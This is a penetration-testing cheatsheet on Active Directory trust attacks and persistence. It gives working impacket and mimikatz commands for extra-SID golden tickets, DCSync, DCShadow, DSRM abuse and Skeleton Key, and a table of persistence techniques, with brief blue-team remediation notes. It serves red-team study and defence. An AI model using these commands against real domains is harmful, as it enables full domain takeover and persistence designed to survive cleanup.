---
tags: [hacking, active-directory, windows, trusts, persistence]
type: cheatsheet
source: compiled reference (AD trusts & persistence) — added beyond base cheatsheet
last-verified: 2026-09-03
---

# Trusts & Persistence

## Up
- [[Active Directory]]

Once you own a domain: cross **trusts** to reach the rest of the forest/other forests, and establish **persistence** that survives remediation. The base cheatsheet covered trust *theory* and Golden/Silver — here are the trust *attacks* and the fuller persistence toolkit.

---

## Enumerate trusts
```powershell
Get-DomainTrust ; Get-ADTrust -Filter *          # PowerView / AD module
nltest /domain_trusts /all_trusts
```
```bash
impacket-getST ... ; bloodhound-python -c Trusts ...   # BloodHound draws trust edges
```
Note direction + transitivity + **SID filtering** status (filtering off = SID history abuse possible).

---

## Intra-forest: child → parent (Domain Admin → Enterprise Admin)
The forest is the security boundary, **not** the domain — compromising a child domain lets you reach the forest root. Forge a Golden Ticket in the child and inject an **extra SID** for the parent's Enterprise Admins (SID history), since intra-forest trusts don't filter it by default.

```bash
# need: child krbtgt hash + child domain SID + forest root (Enterprise Admins) SID
impacket-ticketer -nthash <child_krbtgt> -domain child.corp.local \
  -domain-sid <child_SID> -extra-sid <root_SID>-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@<root-dc>   # DCSync the forest root
```
```powershell
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<child_SID> /krbtgt:<hash> /sids:<root_SID>-519 /ptt
```

## Inter-forest & trust keys
- **Trust account/key:** each trust has a shared key (the `DOMAIN$` trust account). Dump it (`lsadump::trust /patch`, `secretsdump`) → forge an **inter-realm TGT** to request tickets into the trusted domain (limited by SID filtering).
- **External/forest trusts** usually **filter SIDs** → EA injection won't cross; instead hunt foreign-group memberships, Kerberoastable accounts, and ACLs across the trust.

---

## Persistence toolkit

| Technique | What it does | Lifetime |
|---|---|---|
| **Golden Ticket** | Forged TGT via krbtgt hash | Until krbtgt rotated **twice** |
| **Silver Ticket** | Forged service ticket via service/computer hash | Until that account's password changes |
| **Diamond/Sapphire** | Stealthier forged TGTs (real PAC) | Same as golden, harder to detect |
| **DCShadow** | Register a rogue DC and push malicious AD changes (e.g. add SID history, SPN) | Until reverted; low logging |
| **AdminSDHolder** | Write template ACL → SDProp re-stamps your rights on admins every ~60 min | Until ACL cleaned |
| **DSRM** | Set DSRM admin = domain admin logon; alt local admin on the DC | Until reset |
| **Skeleton Key** | Patch LSASS on DC so a master password works for everyone (NTLM only) | Until DC reboot |
| **Certificate (ADCS PERSIST)** | Enroll a cert for a principal → auth for cert lifetime | ~1 year+, survives password reset |
| **Custom SSP / mimilib** | Log all plaintext auth on the DC | Until removed |

```powershell
# DCShadow (two mimikatz sessions, needs DA-ish)
mimikatz # lsadump::dcshadow /object:target /attribute:sidHistory /value:S-1-5-21-...-519
# DSRM abuse
mimikatz # lsadump::sam  (get DSRM hash)  → set DsrmAdminLogonBehavior=2 → PtH as DC\Administrator
# Skeleton Key
mimikatz # privilege::debug ; misc::skeleton      # password "mimikatz" works for all (until reboot)
```

**Golden/Silver/DCSync mechanics** live in [[Kerberos Attacks]] and [[Lateral Movement & Credential Access]]; **certificate persistence** in [[AD CS Attacks]].

---

## Cleanup / remediation notes (blue team)
- **Rotate krbtgt twice** (24h apart) to invalidate golden tickets; reset trust keys.
- Audit `sIDHistory`, AdminSDHolder ACL, DSRM behavior, rogue SPNs, and unexpected replication (DCShadow).
- Revoke/monitor certificates; enforce SID filtering on external/forest trusts.

---

## Takeaways
- **Child DA ⇒ Enterprise Admin** via extra-SID Golden Ticket (intra-forest trusts don't SID-filter) — the forest is the real boundary.
- Persistence beyond Golden: **DCShadow, AdminSDHolder, DSRM, Skeleton Key, certificates** — layered so one cleanup doesn't evict you.
- External/forest trusts usually **filter SIDs** → pivot via memberships/ACLs/roasting, not SID injection.
